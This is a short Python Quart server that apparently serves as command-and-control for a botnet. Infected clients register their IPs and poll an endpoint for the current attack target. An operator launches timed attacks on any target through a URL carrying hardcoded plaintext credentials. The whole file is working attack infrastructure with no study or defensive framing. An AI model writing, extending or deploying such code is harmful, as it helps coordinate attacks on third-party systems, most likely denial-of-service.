from quart import Quart
from time import sleep
from threading import Thread
app = Quart(__name__)

users = {'frick':'yeahm8'}
class akek:
    def __init__(self):
        self.keks = 0
        self.kek_ips = []

    def friends(self):
        return self.keks

    def add_kek(self, ip):
        for x in self.kek_ips:
            if x == ip:
                return
        self.kek_ips.append(ip)
        self.keks = len(self.kek_ips)

    def remove_kek(self, ip):
        for i, x in enumerate(self.kek_ips):
            if x == ip:
                self.kek_ips.pop(i)
        self.keks = len(self.kek_ips)


class Luca:
    def __init__(self):
        self.running = False
        self.target = ''

    def timeout(self, timeout):
        print('starting timeout thread')
        sleep(timeout)
        self.running = False
        self.target = ''
        print('attack ending')

    def is_attack_running(self):
        return self.running

    def attack_target(self):
        return self.target

    def start_attacc(self, target, timeout):
        self.running = True
        self.target = target
        thread = Thread(target=self.timeout, args=(int(timeout),))
        thread.start()


ಠ_ = akek()
ಠ_ಠ = Luca()


@app.route('/')
async def root():
    return "lulw"


@app.route('/friends')
async def friends():
    return f'you have {ಠ_.friends()} friends'


@app.route('/infected')
async def infected():
    pwnd = 0
    return "you got pwnd m8 " + str(69 * pwnd)


@app.route('/hellonewfriend/<ip>')
async def hellow(ip):
    ಠ_.add_kek(ip)
    return 'hellow'


@app.route('/byeoldfriend/<ip>')
async def byew(ip):
    ಠ_.remove_kek(ip)
    return ":{"


@app.route('/scary')
async def oof():
    if ಠ_ಠ.is_attack_running():
        return 'lez hit em '+ ಠ_ಠ.attack_target()
    else:
        return 'chill out m8'


@app.route('/ident/<user>/<passwd>')
async def ident(user, passwd):
    if user in users:
        if users[user] == passwd:
            return 'lul'
    return 'kekw'


@app.route('/scare/<user>/<passwd>/<oop>/<tmout>')
async def boo(user, passwd, oop, tmout):
    if user in users:
        if users[user] == passwd:
            ಠ_ಠ.start_attacc(oop, tmout)
            return f'oop you scared {oop} for {tmout} seconds'
    return 'kekw'
app.run()